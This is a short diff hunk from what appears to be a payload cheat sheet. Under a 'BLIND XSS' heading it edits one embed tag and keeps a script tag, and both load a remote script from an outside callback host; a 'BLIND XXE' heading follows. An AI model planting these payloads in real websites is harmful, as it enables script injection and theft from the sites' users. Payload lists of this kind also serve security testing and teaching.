@@ -32,7 +32,7 @@
 BLIND XSS 
 
 ```
-<embed src="http://mysite.com/bxssrf/request.php">
+<embed src="http://mysite.com/request.php">
 <script src="http://mysite.com/bxssrf/request.php">
 ```
 BLIND XXE
